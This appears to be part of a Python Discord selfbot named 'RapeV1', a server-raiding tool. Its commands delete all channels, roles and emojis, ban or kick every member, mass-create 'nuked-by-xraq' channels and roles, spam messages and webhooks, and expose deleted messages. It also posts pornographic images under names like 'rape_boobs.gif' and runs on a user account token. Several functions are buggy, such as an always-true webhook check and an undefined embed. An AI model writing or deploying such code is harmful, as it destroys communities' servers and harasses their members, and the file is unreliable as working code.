async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"rape_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        

@bot.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"bot_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@bot.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"rape_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em) 

@bot.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"rape_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    bot.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        bot.antiraid = True
        await ctx.send('Anti-Nuke is now **enabled**', delete_after=3)
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        bot.antiraid = False
        await ctx.send('Anti-Nuke is now **disabled**', delete_after=3) 

@bot.command()
async def sendhook(ctx, webhook, *, message):
    await ctx.message.delete()
    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        embed = discord.Embed(description=f"webhook not valid.", color=0x6495ED)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f"sucessfully sent {message} to {webhook}", color=0x6495ED)
        await ctx.send(embed=embed)

@bot.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: 
        em = discord.Embed(name = f"Last deleted message in #{channel.name}", description = snipe_message_content[channel.id], color=0x6495ED)
        em.set_footer(text = f"This message was sent by {snipe_message_author[channel.id]}")
        await ctx.send(embed = em)
    except: 
        await ctx.send(f"There are no recently deleted messages in #{channel.name}")


@bot.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        await member.kick()


@bot.command()
async def rape(ctx):
    # LOL
    print('Deleting all...')
    
    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")

    for _i in range(10):
        await ctx.guild.create_text_channel(name="nuked-by-xraq")
        print(f"{_i} channel(s) have been deleted")

    for member in ctx.guild.members:

        if member == bot.user:
            continue

        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been banned from {ctx.guild.name}")
        
    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            
    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")

    print("Server raped successfully")
    time.sleep(10)
    os.system("cls")
    banner()


@bot.command()
async def github(ctx):
    await ctx.message.delete()
    webbrowser.open_new('https://github.com/moronnnn')

@bot.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 50)

@bot.command()
async def masschannel(ctx):
    await ctx.message.delete()
    for _i in range(250):
        await ctx.guild.create_text_channel(name="nuked-by-xraq")


@bot.command()
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(100):
        await ctx.guild.create_role(name="nuked by xraq")

@bot.command()
async def nuke(ctx, channel: discord.TextChannel = None):
    if channel == None: 
        await ctx.send("You did not mention a channel!")
        return

    nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)

    if nuke_channel is not None:
        new_channel = await nuke_channel.clone(reason="Has been Nuked!")
        await nuke_channel.delete()
        await new_channel.send("channel was nuked successfully! :bomb: ")
        await new_channel.send("https://c.tenor.com/24gGug50GqQAAAAC/nuke-nuclear.gif")
        await ctx.send("Nuked the Channel successfully!")

    else:
        await ctx.send(f"No channel named {channel.name} was found!")

@bot.command()
async def restart(ctx):
    await ctx.message.delete()
    clear()
    os.system('python "' + os.getcwd() + "\\" + sys.argv[0] + '"')

@bot.command()

async def banall(ctx):

    for member in ctx.guild.members:

        if member == bot.user:
            continue

        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been banned from {ctx.guild.name}")

    await all(ctx)

    print("Action Completed: destroy")

@bot.command(aliases=["deleteall"])
async def d(ctx, limit: int=None):
    await ctx.message.delete()
    dt = datetime.datetime.now()
    current_time = dt.strftime("%H:%M:%S")
    passed = 0
    failed = 0
    async for msg in ctx.message.channel.history(limit=limit):
        if msg.author.id == bot.user.id:
            try:
                await msg.delete()
                passed += 1
            except:
                failed += 1

@bot.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.channel.history(limit=amount):
        if message.author == bot.user:
            await message.delete()
        else:
            pass

@bot.command()
async def delhook(ctx, webhook: str):
    await ctx.message.delete()
    if not webhook:
        return
    else:
        r = requests.delete(webhook)
        if (r.status_code == 204):
            embed = discord.Embed(description=f"webhook was deleted successfully.", color=0x6495ED)
        else:
            embed = discord.Embed(description=f"failed to delete webhook. possibly deleted already or invalid.", color=0x6495ED)
            await ctx.send(embed=embed, delete_after=del_after)

@bot.command(name='purgehack')
async def purgehack(ctx):
        await ctx.message.edit(content='ﾠﾠ\n'* 400 + 'ﾠﾠ')

@bot.command(aliases=['whois'])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed.set_thumbnail(url=member.avatar_url)

    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Display Name", value=member.display_name)
    embed.add_field(name="Animated Avatar? ", value=member.is_avatar_animated())
    try:
        embed.add_field(name="Mutual Friends", value=len(await member.mutual_friends()))
    except:
        pass

    embed.add_field(name="Created Account On", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role", value=member.top_role.mention)
    await ctx.send(embed=embed)

@bot.command()
async def createdm(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.create_dm()

@bot.command()
async def catkiss(ctx):
    await ctx.message.delete()
    await ctx.send("cat kiss")
    await ctx.send("https://c.tenor.com/RiHiEx9u-r0AAAAC/cat-hug.gif")

if rich_presence:
    try:
        rpc = Presence(client_id='900216197000359986')
        rpc.connect()
        rpc.update(details='RapeV1 made by Xraq.', large_image='avatar', start=time.time())
    except Exception as e:
        print(f'')
        time.sleep(1)
    
        
bot.run(token, bot=False)
